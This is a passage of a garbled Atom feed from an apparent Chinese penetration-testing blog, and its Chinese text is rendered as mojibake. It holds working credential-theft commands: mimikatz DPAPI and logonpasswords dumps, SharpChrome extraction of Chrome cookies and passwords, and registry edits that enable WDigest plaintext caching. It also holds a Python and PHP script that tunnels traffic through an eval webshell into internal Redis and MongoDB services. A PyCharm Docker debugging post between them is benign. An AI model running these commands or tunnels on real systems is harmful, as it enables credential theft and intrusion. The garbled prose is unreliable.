åˆ°ç›®æ ‡æœºå™¨ä¸Šé¢ï¼Œç„¶å:</p><pre class="line-numbers language-none"><code class="language-none"># dumpå‡ºæ¥masterKeysekurlsa::dpapi# æŸ¥çœ‹å·²ç»ç¼“å­˜çš„keydpapi::cache# ä¸€é”®dumpshareDPAPI -dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦å¤–å¯ä»¥ä½¿ç”¨<code>SharepChrome</code>æ¥å¯¼å‡ºChromeçš„å¯†ç å’Œå†å²è®°å½•ï¼Œå¯ä»¥é…åˆ<code>SharepWeb</code>å¯¼å‡ºfirefoxã€EDGEæµè§ˆå™¨çš„ä¿¡æ¯ç­‰</p><pre class="line-numbers language-none"><code class="language-none">SharpChrome.exe cookies &#x2F;target:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cookies&quot; &#x2F;unprotectSharpChrome.exe logins &#x2F;target:&quot;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="é«˜ç‰ˆæœ¬é™åˆ¶"><a href="#é«˜ç‰ˆæœ¬é™åˆ¶" class="headerlink" title="é«˜ç‰ˆæœ¬é™åˆ¶"></a>é«˜ç‰ˆæœ¬é™åˆ¶</h4><p>åœ¨win10å’Œ2012R2ä»¥ä¸Šçš„æ—¶å€™ï¼Œé»˜è®¤å†…å­˜ç¼“å­˜ä¸­ç¦æ­¢ä¿å­˜æ˜æ–‡å¯†ç ,éœ€è¦å¼€å¯wdigest Auth:</p><ul><li>cmd</li></ul><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>powershell</li></ul><pre class="line-numbers language-none"><code class="language-none">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>å…³é—­å‘½ä»¤:</li></ul><pre class="line-numbers language-none"><code class="language-none">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¼€å¯ä¹‹åï¼Œéœ€è¦ç®¡ç†å‘˜é‡æ–°ç™»é™†æ‰å¯ä»¥æŠ“æ˜æ–‡å¯†ç :</p><pre class="line-numbers language-none"><code class="language-none">rundll32 user32.dll,LockWorkStationmimikatz:sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://xz.aliyun.com/t/6508">https://xz.aliyun.com/t/6508</a></li><li><a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey/</a></li><li><a href="https://github.com/djhohnstein/SharpWeb">https://github.com/djhohnstein/SharpWeb</a></li><li><a href="https://github.com/djhohnstein/SharpChromium">https://github.com/djhohnstein/SharpChromium</a></li><li><a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;èƒŒæ™¯ä»‹ç»&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯ä»‹ç»&quot;&gt;&lt;/a&gt;èƒŒæ™¯ä»‹ç»&lt;/h3&gt;&lt;p&gt;DPAPI(Date Protection Application Programming Interface)ï¼Œä»windows2000ä¹‹åï¼Œå¾®è½¯æä¾›çš„ä¸€ä¸ªç‰¹æ®Šæ•°æ®ä¿æŠ¤æ¥å£ï¼Œä½¿ç”¨äº†å¯¹ç§°çš„åŠ è§£å¯†å‡½æ•°å¯¹å¯†ç åŠ å¯†ã€‚åŒ…æ‹¬:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IEã€Chromeå¯†ç ç™»é™†è¡¨å•çš„è‡ªåŠ¨å®Œæˆ&lt;/li&gt;
&lt;li&gt;é‚®ç®±å®¢æˆ·ç«¯ç”¨æˆ·å¯†ç &lt;/li&gt;
&lt;li&gt;FTPç®¡ç†è´¦æˆ·å¯†ç &lt;/li&gt;
&lt;li&gt;è¿œç¨‹æ¡Œé¢èº«ä»½å¯†ç &lt;/li&gt;
&lt;li&gt;â€¦â€¦&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æŸ¥æ‰¾æœ¬åœ°çš„Credentials:&lt;br&gt;é€šå¸¸çš„ä¿å­˜ä½ç½®:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%appdata%\Microsoft\Credentials&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%localappdata%\Microsoft\Credentials&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%userprofile%\AppData\Local\Microsoft\Credentials\*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å› ä¸ºæ–‡ä»¶è¢«éšè—ï¼Œå‘½ä»¤è¡Œä¸‹éœ€è¦æŸ¥çœ‹éœ€è¦åŠ ä¸Š&lt;code&gt;/a&lt;/code&gt;å¯ä»¥çœ‹åˆ°:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;dir &amp;#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;è·å–GUID&quot;&gt;&lt;a href=&quot;#è·å–GUID&quot; class=&quot;headerlink&quot; title=&quot;è·å–GUID&quot;&gt;&lt;/a&gt;è·å–GUID&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;# æ‰“å°ç»“æ„ä½“ä¿¡æ¯
mimikatz dpapi::cred &amp;#x2F;in:&amp;quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : &amp;#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&amp;#125;
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : &amp;#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&amp;#125;
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : æœ¬åœ°å‡­æ®æ•°æ®

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
  dwDataLen          : 00002a70 - 10864
  pbData             : xxxxxxz
  dwSignLen          : 00000040 - 64
  pbSign             : xxxxx
&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Pycharmè¿œç¨‹è°ƒè¯•Docker</title>
    <link href="https://jkme.github.io/2019/12/13/python-debug.html"/>
    <id>https://jkme.github.io/2019/12/13/python-debug.html</id>
    <published>2019-12-12T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.944Z</updated>
    
    <content type="html"><![CDATA[<p>è°ƒè¯•çš„æµæ°´è´¦:</p><p>åŸç†å°±æ˜¯pycharmä½œä¸ºserverï¼Œè¿œç¨‹è¦debugçš„æ˜¯clientã€‚åœ¨clientè¦å®‰è£…pycharm-debug.eggï¼Œå®‰è£…ä¹‹å</p><pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ²¡æ¯›ç—…å°±è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p><p>è¿™ä¸ªpycharmçš„åŒ…ä¸€èˆ¬åœ¨è¿™ä¸ªç›®å½•:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åé…ç½®pycharm:</p><pre class="line-numbers language-none"><code class="language-none">åœ¨Preferences -&gt; project ä¼šæœ‰å½“å‰é¡¹ç›®ï¼Œå¯ä»¥å…ˆè®¾ç½® project Interpreterï¼Œä½†æ˜¯å¦‚æœå•å•ä¸ºäº†è°ƒè¯•ï¼Œè¿™ä¸ªä¸ç”¨è®¾ç½®å°±å¯ä»¥ã€‚ä¸ºäº†æµ‹è¯•æ–¹ä¾¿å¯ä»¥æ·»åŠ ä¸€ä¸ªsftpåŒæ­¥:Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deploymentæ·»åŠ å’ŒDockerç›¸å…³çš„ç«¯å£å’ŒIPï¼Œä¸¾ä¾‹æ¥è¯´æŠŠDockerçš„22ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„20022ã€‚è®¾ç½®å®Œäº†ä¹‹åï¼Œå¯ä»¥åœ¨è¿™é‡ŒåŒæ­¥ä»£ç :Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»è¿‡ä¸Šé¢çš„æ­¥éª¤ç°åœ¨æœ‰äº†ä¸€ä¸ªsftpæ¥åŒæ­¥æœ¬åœ°çš„ä»£ç å’Œè¿œç¨‹çš„ä»£ç ï¼Œç„¶åè®¾ç½®ä½¿ç”¨pydevdæ¥è¿œç¨‹è°ƒè¯•ã€‚</p><p>åœ¨Run/Debug configurationsé‡Œé¢ï¼Œé€‰æ‹©æ·»åŠ Python Remote Debugã€‚</p><p>å…¶ä¸­çš„<code>local host name</code>è¦è®¾ç½®ä¸ºpycharmæœºå­çš„IPï¼ŒPORTéšä¾¿å¡«ï¼Œæ¯”å¦‚11000ã€‚<br>è®¾ç½®å®Œæˆä¹‹åï¼Œæ³¨æ„è®¾ç½®ä¸‹Path Mappingsï¼Œè®¾ç½®å¥½æœ¬åœ°ä¸»æœºçš„è·¯å¾„æºä»£ç å’Œè¿œç¨‹çš„è·¯å¾„ã€‚å¦‚æœè¿™é‡Œä¸è®¾ç½®å¥½ï¼Œåœ¨è°ƒè¯•çš„æ—¶å€™Py</p><p>æœ€åæŠŠä¸¤è¡Œä»£ç åŠ åˆ°è¦debugçš„æœºå­æ–‡ä»¶ä¸Š,æ³¨æ„æŠŠpycharm-debug.eggæ·»åŠ åˆ°è·¯å¾„é‡Œé¢:</p><pre class="line-numbers language-none"><code class="language-none">import syssys.path.append(&#39;&#x2F;root&#x2F;pycharm-debug.egg&#39;)import pydevdpydevd.settrace(&#39;192.168.140.40&#39;, port&#x3D;10000, stdoutToServer&#x3D;True, stderrToServer&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªæ—¶å€™å·²ç»è®¾ç½®å…¨éƒ¨å®Œæˆï¼Œæœ¬åœ°çš„pycharmå¯åŠ¨è¿œç¨‹è°ƒè¯•ï¼Œç„¶ååœ¨dockerä¸Šé¢å¯åŠ¨Pythonåº”ç”¨ã€‚</p><p>å¦‚æœä¸ç¡®å®šæœ¬åœ°çš„pycharmæ˜¯ä¸æ˜¯å¯åŠ¨æˆåŠŸäº†ï¼Œå¯ä»¥telnetä¸€ä¸‹å¯¹åº”çš„ç«¯å£ï¼Œä¼šæœ‰ç±»ä¼¼è¿™ç§å†…å®¹å‡ºç°:</p><p><img src="../output/images/15762160114084.jpg"></p><pre class="line-numbers language-none"><code class="language-none">strace -p 27691 -e trace&#x3D;read,write -s 1024<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹è¯»å†™è°ƒç”¨ã€‚</p><h3 id="SSH-Remote-Debug"><a href="#SSH-Remote-Debug" class="headerlink" title="SSH Remote Debug"></a>SSH Remote Debug</h3><p>å¦‚æœæ˜¯sshçš„Remote Debugï¼Œåœ¨è®¾ç½®interpreterçš„æ—¶å€™ï¼Œè®¾ç½®è¿œç¨‹æœåŠ¡å™¨çš„pythonè§£é‡Šå™¨å°±å¯ä»¥äº†ï¼Œåœ¨Dockeré‡Œé¢ä¹‹æ‰€ä»¥sshç±»å‹çš„è¿œç¨‹è°ƒè¯•å¤±è´¥ï¼Œåº”è¯¥æ˜¯Dockerçš„ç«¯å£æ²¡æœ‰æ˜ å°„åˆ°æœ¬åœ°é€ æˆçš„ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è°ƒè¯•çš„æµæ°´è´¦:&lt;/p&gt;
&lt;p&gt;åŸç†å°±æ˜¯pycharmä½œä¸ºserverï¼Œè¿œç¨‹è¦debugçš„æ˜¯clientã€‚åœ¨clientè¦å®‰è£…pycharm-debug.eggï¼Œå®‰è£…ä¹‹å&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;python -m easy_install pycharm-debug.egg&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;import pydevd&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æ²¡æ¯›ç—…å°±è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªpycharmçš„åŒ…ä¸€èˆ¬åœ¨è¿™ä¸ªç›®å½•:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&amp;#x2F;Applications&amp;#x2F;PyCharm.app&amp;#x2F;Contents&amp;#x2F;debug-eggs&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç„¶åé…ç½®pycharm:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;åœ¨Preferences -&amp;gt; project ä¼šæœ‰å½“å‰é¡¹ç›®ï¼Œå¯ä»¥å…ˆè®¾ç½® project Interpreterï¼Œä½†æ˜¯å¦‚æœå•å•ä¸ºäº†è°ƒè¯•ï¼Œè¿™ä¸ªä¸ç”¨è®¾ç½®å°±å¯ä»¥ã€‚ä¸ºäº†æµ‹è¯•æ–¹ä¾¿å¯ä»¥æ·»åŠ ä¸€ä¸ªsftpåŒæ­¥:

Flie-&amp;gt;Setting-&amp;gt;Build,Exception,Deployment-&amp;gt;Deployment

æ·»åŠ å’ŒDockerç›¸å…³çš„ç«¯å£å’ŒIPï¼Œä¸¾ä¾‹æ¥è¯´æŠŠDockerçš„22ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„20022ã€‚è®¾ç½®å®Œäº†ä¹‹åï¼Œå¯ä»¥åœ¨è¿™é‡ŒåŒæ­¥ä»£ç :

Tools-&amp;gt;Deployment-&amp;gt;Sync with deploymed to sftp&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»è¿‡ä¸Šé¢çš„æ­¥éª¤ç°åœ¨æœ‰äº†ä¸€ä¸ªsftpæ¥åŒæ­¥æœ¬åœ°çš„ä»£ç å’Œè¿œç¨‹çš„ä»£ç ï¼Œç„¶åè®¾ç½®ä½¿ç”¨pydevdæ¥è¿œç¨‹è°ƒè¯•ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://jkme.github.io/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP Eval HTTP Proxy</title>
    <link href="https://jkme.github.io/2019/10/23/php-eval-proxy.html"/>
    <id>https://jkme.github.io/2019/10/23/php-eval-proxy.html</id>
    <published>2019-10-22T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.938Z</updated>
    
    <content type="html"><![CDATA[<p>èƒŒæ™¯: linuxï¼Œphpç¯å¢ƒä¸‹çš„reGeorgä¸å¯ç”¨ã€‚<br>ç›®æ ‡: åˆ†æreGeorgçš„åŸç†å°è¯•æ”¹ä¸€ä¸‹<br>ç»“æœ: é€ äº†ä¸€ä¸ªåŠæˆå“ï¼Œå› ä¸ºä¸èƒ½ä¿æŒsocksè¿é€šï¼Œå¯ä»¥ç”¨æ¥è®¿é—®ç®€å•çš„åè®®æµæ•°æ®ã€‚æ¯”å¦‚httpï¼Œmongoï¼Œredis</p><pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle  HTTP based protocol:    Elastic, CouchDB, Mongodb, Docker  Text-based protocol:    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å°è¯•1"><a href="#å°è¯•1" class="headerlink" title="å°è¯•1"></a>å°è¯•1</h3><p>è¿™ä¸ªè„šæœ¬æ˜¯ä¸ªæ®‹çš„:</p><pre class="line-numbers language-none"><code class="language-none">#coding: utf-8import socketimport binasciiimport requestsheaders &#x3D; &#123;&quot;Host&quot;: &quot;&quot;,&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,&quot;Connection&quot;: &quot;close&quot;&#125;url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)s.bind((&quot;127.0.0.1&quot;,8889))s.listen(5)sock, addr_info &#x3D; s.accept()while True:    print &#39;Connect by &#39;, addr_info    data &#x3D; sock.recv(102400)    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;    print payload    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content    print data2    print &quot;sending data&quot;    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p><p>ç»‘å®šæœ¬æœºçš„8889ç«¯å£ï¼Œç„¶åmongoç›´æ¥è¿,<code>mongo --port 8889</code>,å¦‚æœæƒ³è§‚å¯Ÿä¹‹é—´çš„æµé‡å¯ä»¥è¿™æ ·åš:</p> <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;ç›‘å¬8889socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;æµé‡è‚‰çœ¼å¯ä»¥çœ‹mongo --port 8888  &#x2F;&#x2F;è¿æ¥8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å‘æ•£ä¸€ä¸‹ï¼Œè¿™ä¸ªæ•´ä½“å°±æ˜¯ä¸€ä¸ªè¯·æ±‚ä»£ç†ï¼ŒåŒ…è£¹ä¸€ä¸‹å‘é€åˆ°äº†è¿œç¨‹çš„webshellï¼Œç„¶åwebshellä¹‹è¡Œè„šæœ¬ã€‚Regeorgæ˜¯æ›´é€šç”¨çš„æ–¹å¼ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªè„šæœ¬çœ‹ä½œregeorgä½œç”¨çš„<code>å­é›†</code>ï¼Œå› ä¸ºå¦‚æœè¦è®¿é—®ç«¯å£ä¹‹ç±»çš„å°±éœ€è¦æ”¹è„šæœ¬äº†ã€‚</p><p>çœ‹äº†çœ‹Regeorgçš„å®ç°ï¼Œå°±æ˜¯æ¥å—socks5æˆ–è€…socks4çš„ä»£ç†ä¹‹åï¼Œå‘é€æ•°æ®åŒ…åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿‡ç¨‹å¤§æ¦‚æ˜¯è¿™æ ·å­çš„:</p><pre class="line-numbers language-none"><code class="language-none">Connect: è¿æ¥ä¹‹åç”Ÿæˆä¸€ä¸ªcookieForward: æŠŠè¦è¯·æ±‚çš„æ•°æ®åŒ…æ”¾åœ¨cookieé‡Œé¢çš„writebufRead: Regeorgçš„è„šæœ¬è¯»å–writbufçš„æ•°æ®åŒ…ä¹‹åè¯·æ±‚æ¥å£æœåŠ¡ï¼Œæ¯”å¦‚curlè®¿é—®å†…ç½‘ç«¯å£ã€‚ç„¶åæŠŠç»“æœå†™å…¥åˆ°cookieé‡Œé¢çš„readbufï¼Œè¯»å–readbufçš„å†…å®¹Disconnect: æŠŠcookieé‡Œé¢çš„runæ ‡å¿—å˜ä¸ºfalseï¼Œcookieå°±ä¸å†ä½¿ç”¨äº†ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥å½“Regeorgä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œæ¯”å¦‚ç¬¬ä¸€æ­¥çš„connectæ— æ³•ç”Ÿæˆã€‚<br>ä¸Šé¢è„šæœ¬çš„è¿‡ç¨‹æ˜¯è¿™æ ·å­çš„: æˆ‘çœ‹äº†çœ‹regeorgçš„æºä»£ç ï¼Œç™¾æ€ä¸å¾—å…¶è§£ä¸ºä»€ä¹ˆconnectæ²¡ç”Ÿæˆï¼Œè°ƒè¯•äº†å‡ å¤©æ²¡ç»“æœã€‚ï¼ˆå¥½èœ.jpg)ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘å‘ç°regeorgçš„phpåŸç†åŸºæœ¬å°±æ˜¯ä¸Šé¢çš„æ­¥éª¤ã€‚æ‰€ä»¥æˆ‘å°±æ‰‹åŠ¨å†™è„šæœ¬å°è¯•å¯è¡Œã€‚</p><p>æœ‰ä¸€ä¸ªä¸çŸ¥é“æ˜¯ä»€ä¹ˆå‘çš„é—®é¢˜: å½“æˆ‘æŠŠipä½œä¸ºå˜é‡å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨çš„æ—¶å€™ï¼Œè¿œç¨‹æœåŠ¡å™¨ä¼šå‡ºç°epool_waitçš„é”™è¯¯ã€‚ä½†æ˜¯å½“æ•´ä¸ªè„šæœ¬æ”¾åœ¨è¿œç¨‹æœåŠ¡å™¨çš„æ—¶å€™å°±å¯ä»¥è¿è¡Œäº†ã€‚</p><pre class="line-numbers language-none"><code class="language-none">å¤±è´¥:&lt;?php$ip &#x3D; $_POST[&#39;ip&#39;];$port &#x3D; $_POST[&#39;port&#39;];$com &#x3D; $_POST[&#39;command&#39;];$payload &#x3D; $com.&#39;\r\n&#39;;$res &#x3D; fsockopen($ip,(int)$port,$errno, $errstr);&#x2F;&#x2F;$res &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;127.0.0.1:6379&quot;, $errno, $errstr);var_dump($res);stream_set_timeout(1);stream_set_blocking(false);fwrite($res,$raw);while ($o&#x3D;fgets($res,5))&#123;$readbuf .&#x3D; $o;&#125;var_dump($readbuf);fclose($res);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">æˆåŠŸ:&lt;?php$res &#x3D; fsockopen(&quot;127.0.0.1&quot;,6379);$raw &#x3D; &quot;info\r\n&quot;;stream_set_timeout($res,1);stream_set_blocking(false);fwrite($res,$raw);$info &#x3D; stream_get_meta_data($res);echo $info[&#39;timed_out&#39;];while ($o &#x3D;fgets($res,5))&#123;        if($o &#x3D;&#x3D;&#x3D; false)&#123;echo &#39;false lala&#39;;&#125;$readBuff .&#x3D; $o;&#125;var_dump($readBuff);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æˆ‘åˆ°äº†ç°åœ¨è¿™ä¸€æ­¥ï¼Œå…¶å®æ˜¯ä¸­é—´å‘ç°antswordçš„æ‰«æç«¯å£åŸç†ï¼Œå°±æ˜¯åŒ…è£…å¥½æ•°æ®åŒ…å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿œç¨‹æœåŠ¡å™¨åšä¸€ä¸ªevalã€‚</p><p>æ—¢ç„¶æ˜¯evaläº†ï¼Œé‚£ä¹ˆå°±æ˜¯è·Ÿxssä¸€ä¸ªåŸç†: ä½ æœ‰äº†ä¸€ä¸ªâ€ç¼–è¾‘å™¨â€ã€‚</p><p>æ‰€ä»¥å‘¢ï¼Œå†çœ‹çœ‹å‰é¢çš„regeorgçš„åŸç†ï¼Œå‰©ä¸‹æœ€åä¸€æ­¥äº†ï¼Œæ”¹é€ 